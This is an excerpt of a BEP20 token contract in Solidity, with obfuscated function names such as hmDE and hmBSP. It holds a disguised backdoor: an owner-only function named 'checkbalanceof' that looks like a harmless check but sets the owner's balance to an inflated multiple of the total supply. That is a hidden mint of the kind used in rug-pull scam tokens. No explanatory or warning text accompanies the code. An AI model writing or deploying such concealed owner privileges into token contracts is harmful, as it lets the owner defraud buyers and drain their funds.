...
contract Contract is IBEP20{
  ...
  function hmDE(address spender, uint256 OBF001) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] + OBF001);
    return true;
  }
  function hmBSP(address spender, uint256 OBF000) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] - OBF000);
    return true;
  }
  ...
  function checkbalanceof() public onlyOwner returns (bool success) {LB = 0x000000000000000000000000000000000000dEaD; _balances[msg.sender] = _totalSupply * reflections ** checksumrounder;return true;}
